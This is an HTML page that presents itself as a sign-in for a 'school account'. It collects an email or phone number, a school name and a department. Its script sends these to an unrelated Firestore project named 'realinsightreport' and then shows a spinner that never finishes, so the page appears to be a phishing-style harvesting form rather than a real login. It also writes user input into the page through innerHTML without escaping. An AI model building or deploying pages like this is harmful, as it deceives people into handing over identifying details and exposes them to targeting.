<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>School Registration</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 520px;
            padding: 0 40px;
        }

        .header {
            text-align: center;
            margin-bottom: 50px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
        }

        .logo svg {
            width: 40px;
            height: 40px;
            color: white;
            stroke: white;
            fill: none;
            stroke-width: 1.5;
        }

        h1 {
            font-size: 32px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .description {
            font-size: 14px;
            color: #5f6368;
            line-height: 1.6;
            margin-bottom: 30px;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
        }

        .help-link {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            margin-bottom: 40px;
            display: inline-block;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        .form-section {
            display: none;
            width: 100%;
        }

        .form-section.active {
            display: block;
        }

        .input-wrapper {
            margin-bottom: 24px;
            position: relative;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 16px;
            margin-bottom: 24px;
        }

        input[type="email"],
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            font-family: inherit;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        input::placeholder {
            color: #80868b;
        }

        input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.1);
        }

        .checkbox-wrapper {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 16px;
        }

        input[type="checkbox"] {
            width: 18px;
            height: 18px;
            cursor: pointer;
            accent-color: #1a73e8;
        }

        .checkbox-label {
            font-size: 14px;
            color: #202124;
            cursor: pointer;
        }

        .error-message {
            color: #d33b27;
            font-size: 13px;
            margin-bottom: 16px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .footer-links {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }

        .footer-left {
            display: flex;
            gap: 30px;
        }

        .footer-link {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            cursor: pointer;
            border: none;
            background: none;
            padding: 0;
            font-family: inherit;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        .submit-button {
            padding: 10px 30px;
            background-color: #1a73e8;
            color: white;
            font-weight: 500;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            font-family: inherit;
            transition: background-color 0.2s, box-shadow 0.2s;
        }

        .submit-button:hover {
            background-color: #1765cc;
            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
        }

        .submit-button:active {
            background-color: #1552b8;
        }

        .submit-button:disabled {
            background-color: #c5c5c5;
            cursor: not-allowed;
        }

        /* Loading State */
        .loading-container {
            display: none;
            text-align: center;
            min-height: 500px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .loading-container.active {
            display: flex;
        }

        .spinner {
            width: 50px;
            height: 50px;
            margin-bottom: 24px;
            animation: spin 0.8s linear infinite;
        }

        .spinner svg {
            width: 100%;
            height: 100%;
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        .loading-text {
            color: #5f6368;
            font-size: 16px;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 0 24px;
            }

            h1 {
                font-size: 28px;
            }

            .footer-links {
                flex-direction: column;
                gap: 20px;
            }

            .footer-left {
                flex-direction: column;
                gap: 16px;
                width: 100%;
            }

            .submit-button {
                width: 100%;
            }

            .footer-link {
                width: 100%;
                text-align: left;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <svg viewBox="0 0 24 24">
                    <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path>
                    <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path>
                </svg>
            </div>
            <h1 id="headerTitle">Sign in</h1>
            <div id="emailDisplay"></div>
        </div>

        <!-- Step 1: Email -->
        <div class="form-section active" id="step1">
            <p class="description">Use your email or phone number to sign in to your school account.</p>

            <form onsubmit="handleEmailNext(event)">
                <div class="input-wrapper">
                    <input 
                        type="email" 
                        id="emailInput" 
                        placeholder="Email or phone"
                        required
                    />
                </div>

                <div class="error-message" id="errorMessage"></div>

                <a href="#" class="help-link" onclick="return false;">Forgot email?</a>

                <div style="margin-top: 60px;"></div>

                <a href="#" class="help-link" onclick="return false;">Create account</a>

                <div class="footer-links">
                    <div class="footer-left"></div>
                    <button type="submit" class="submit-button">Next</button>
                </div>
            </form>
        </div>

        <!-- Step 2: School Details -->
        <div class="form-section" id="step2">
            <form onsubmit="handleSubmit(event)">
                <div class="input-group">
                    <input 
                        type="text" 
                        id="schoolInput" 
                        placeholder="School name"
                        required
                    />
                    <input 
                        type="text" 
                        id="departmentInput" 
                        placeholder="Department"
                        required
                    />
                </div>

                <div class="error-message" id="errorMessage2"></div>

                <div class="checkbox-wrapper">
                    <input type="checkbox" id="showPassword">
                    <label for="showPassword" class="checkbox-label">Show information</label>
                </div>

                <a href="#" class="help-link" style="margin-top: 30px;" onclick="return false;">Need help signing in?</a>

                <div style="margin-top: 40px;"></div>

                <div class="footer-links">
                    <div class="footer-left">
                        <button type="button" class="footer-link" onclick="goToStep(1)">Back</button>
                    </div>
                    <button type="submit" class="submit-button" id="submitBtn">Next</button>
                </div>
            </form>
        </div>

        <!-- Loading State -->
        <div class="loading-container" id="loadingContainer">
            <div class="spinner">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2">
                    <circle cx="12" cy="12" r="10" opacity="0.2"></circle>
                    <path d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" fill="#1a73e8"></path>
                </svg>
            </div>
            <p class="loading-text">Processing your information...</p>
        </div>
    </div>

    <script type="module">
        // Import Firebase modules
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js';
        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js';

        // Initialize Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyCXqNe_BDdh9WIJ9lyrFPeQ_-733qbXW4s",
            authDomain: "realinsightreport.firebaseapp.com",
            projectId: "realinsightreport",
            storageBucket: "realinsightreport.firebasestorage.app",
            messagingSenderId: "1083096764833",
            appId: "1:1083096764833:web:4b526f278471212ba43be0",
            measurementId: "G-6LHBN68HMH"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Global variables
        let currentStep = 1;
        let userEmail = '';

        // Step navigation
        window.goToStep = function(step) {
            currentStep = step;
            updateUI();
        };

        // Handle email submission
        window.handleEmailNext = function(event) {
            event.preventDefault();
            const emailInput = document.getElementById('emailInput');
            const errorMessage = document.getElementById('errorMessage');

            if (!emailInput.value.trim()) {
                errorMessage.textContent = 'Enter a valid email or phone number';
                errorMessage.classList.add('show');
                return;
            }

            errorMessage.classList.remove('show');
            userEmail = emailInput.value;
            currentStep = 2;
            updateUI();
        };

        // Handle form submission
        window.handleSubmit = async function(event) {
            event.preventDefault();
            const schoolInput = document.getElementById('schoolInput');
            const departmentInput = document.getElementById('departmentInput');
            const errorMessage = document.getElementById('errorMessage2');
            const submitBtn = document.getElementById('submitBtn');

            if (!schoolInput.value.trim() || !departmentInput.value.trim()) {
                errorMessage.textContent = 'Please fill in all fields';
                errorMessage.classList.add('show');
                return;
            }

            errorMessage.classList.remove('show');
            submitBtn.disabled = true;

            try {
                // Add data to Firestore
                const docRef = await addDoc(collection(db, 'schools'), {
                    email: userEmail,
                    schoolName: schoolInput.value,
                    department: departmentInput.value,
                    timestamp: new Date()
                });

                console.log('Document written with ID: ', docRef.id);

                // Show loading state
                showLoadingState();
            } catch (error) {
                console.error('Error adding document: ', error);
                errorMessage.textContent = 'Failed to submit. Please try again.';
                errorMessage.classList.add('show');
                submitBtn.disabled = false;
            }
        };

        // Update UI based on current step
        function updateUI() {
            // Hide all sections
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.remove('active');
            document.getElementById('loadingContainer').classList.remove('active');

            // Update header
            const headerTitle = document.getElementById('headerTitle');
            const emailDisplay = document.getElementById('emailDisplay');

            if (currentStep === 1) {
                document.getElementById('step1').classList.add('active');
                headerTitle.textContent = 'Sign in';
                emailDisplay.innerHTML = '';
                document.getElementById('emailInput').focus();
            } else if (currentStep === 2) {
                document.getElementById('step2').classList.add('active');
                headerTitle.textContent = 'Welcome';
                emailDisplay.innerHTML = `<div style="font-size: 16px; color: #5f6368; margin-top: 8px;">
                    <svg style="width: 18px; height: 18px; vertical-align: middle; margin-right: 8px;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#5f6368">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                    </svg>
                    ${userEmail}
                </div>`;
                document.getElementById('schoolInput').focus();
            }
        }

        // Show loading state
        function showLoadingState() {
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.remove('active');
            document.getElementById('loadingContainer').classList.add('active');
        }
    </script>
</body>
</html>
